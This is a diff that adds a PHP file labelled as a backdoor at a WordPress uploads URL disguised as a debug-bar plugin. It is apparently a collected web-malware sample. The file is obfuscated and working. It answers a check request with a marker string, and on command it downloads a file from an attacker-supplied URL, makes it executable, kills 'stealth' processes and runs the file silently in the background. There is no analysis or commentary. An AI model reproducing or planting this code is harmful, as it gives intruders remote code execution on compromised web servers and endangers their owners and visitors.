@@ -1,0 +1,10 @@
+BackDoor: http://saiinfotech.net/wp-content/uploads/2019/07/3rd-debug-bar.php
+
+<?php
+/*   __________________________________________________
+    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.4   |
+    |              on 2019-07-15 15:52:32              |
+    |    GitHub: https://github.com/pk-fr/yakpro-po    |
+    |__________________________________________________|
+*/
+goto Il; rR: echo "\141\x75\170\x36\x54\150\x65\151\x6f\107\150\165\145\121\x75\63"; goto a0; zV: echo "\157\153"; goto bD; pM: if (!($_POST["\x63\160"] == "\x64\x6f\167\x6e\x6c\x6f\141\144")) { goto QU; } goto a_; bD: mb: goto qk; uF: chmod($M1, 0755); goto Fv; Xx: if (empty($Fy)) { goto mb; } goto vG; a0: die; goto Xa; PG: exec($dX); goto zV; Fv: $dX = "\x2e\x2f{$M1}\40\x3e\x20\x2f\x64\x65\166\57\x6e\x75\x6c\154\40\x32\x3e\x2f\144\145\x76\57\x6e\x75\154\154\40\x26"; goto PG; Il: error_reporting(0); goto e2; jT: exec("\x70\x6b\151\154\x6c\x20\x2d\146\x20\x2d\x39\40\163\x74\x65\x61\x6c\x74\x68"); goto u0; rW: exec("\x70\x6b\151\x6c\154\x20\x2d\x39\x20\55\146\40\163\164\145\141\154\164\x68"); goto jT; vG: @unlink($M1); goto rW; a_: $M1 = substr(str_shuffle(str_repeat($zF = "\x30\x31\62\x33\x34\x35\x36\67\x38\x39\141\x62\x63\144\x65\146\x67\150\151\152\x6b\154\155\156\x6f\x70\161\x72\163\164\x75\x76\167\x78\x79\x7a\x41\x42\103\x44\105\106\107\x48\x49\112\x4b\x4c\x4d\116\x4f\120\121\122\123\x54\125\126\127\130\131\132", ceil(6 / strlen($zF)))), 1, 6); goto Eo; u0: $s9 = file_get_contents(trim($Fy)); goto yE; Eo: $Fy = $_POST["\165\162\x6c"]; goto Xx; e2: if (!($_GET["\x63\x67"] == "\x63\150\153")) { goto EZ; } goto rR; yE: file_put_contents($M1, $s9); goto uF; Xa: EZ: goto pM; qk: QU:
